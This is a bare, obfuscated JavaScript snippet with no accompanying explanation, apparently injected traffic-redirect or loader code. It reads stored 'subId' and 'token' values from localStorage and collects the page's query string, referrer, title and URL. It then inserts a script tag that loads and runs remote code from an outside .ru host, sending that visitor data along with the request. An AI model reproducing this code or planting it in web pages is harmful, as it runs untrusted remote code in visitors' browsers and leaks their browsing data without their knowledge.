(function() {
    var name = '_jrSzGFNhxVjx2JmP';
    if (!window._jrSzGFNhxVjx2JmP) {
        window._jrSzGFNhxVjx2JmP = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://derinews.ru/9R6DKCSJ',
        };
    }
    const _Scsrwkr3GxwhDKGT = localStorage.getItem('config');
    if (typeof _Scsrwkr3GxwhDKGT !== 'undefined' && _Scsrwkr3GxwhDKGT !== null) {
        var _PmFCPb3XLXsgJC3c = JSON.parse(_Scsrwkr3GxwhDKGT);
        var _wYsxn6yFMyQVGpjX = Math.round(+new Date()/1000);
        if (_PmFCPb3XLXsgJC3c.created_at + window._jrSzGFNhxVjx2JmP.ttl < _wYsxn6yFMyQVGpjX) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _YF3bPhd3ZQp3ftMz = localStorage.getItem('subId');
    var _dXm5ynBbDKF13kCj = localStorage.getItem('token');
    var _pwpYpK2RKGBzkjb2 = '?return=js.client';
        _pwpYpK2RKGBzkjb2 += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _pwpYpK2RKGBzkjb2 += '&se_referrer=' + encodeURIComponent(document.referrer);
        _pwpYpK2RKGBzkjb2 += '&default_keyword=' + encodeURIComponent(document.title);
        _pwpYpK2RKGBzkjb2 += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _pwpYpK2RKGBzkjb2 += '&name=' + encodeURIComponent(name);
        _pwpYpK2RKGBzkjb2 += '&host=' + encodeURIComponent(window._jrSzGFNhxVjx2JmP.R_PATH);
    if (typeof _YF3bPhd3ZQp3ftMz !== 'undefined' && _YF3bPhd3ZQp3ftMz && window._jrSzGFNhxVjx2JmP.unique) {
        _pwpYpK2RKGBzkjb2 += '&sub_id=' + encodeURIComponent(_YF3bPhd3ZQp3ftMz);
    }
    if (typeof _dXm5ynBbDKF13kCj !== 'undefined' && _dXm5ynBbDKF13kCj && window._jrSzGFNhxVjx2JmP.unique) {
        _pwpYpK2RKGBzkjb2 += '&token=' + encodeURIComponent(_dXm5ynBbDKF13kCj);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._jrSzGFNhxVjx2JmP.R_PATH + _pwpYpK2RKGBzkjb2;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
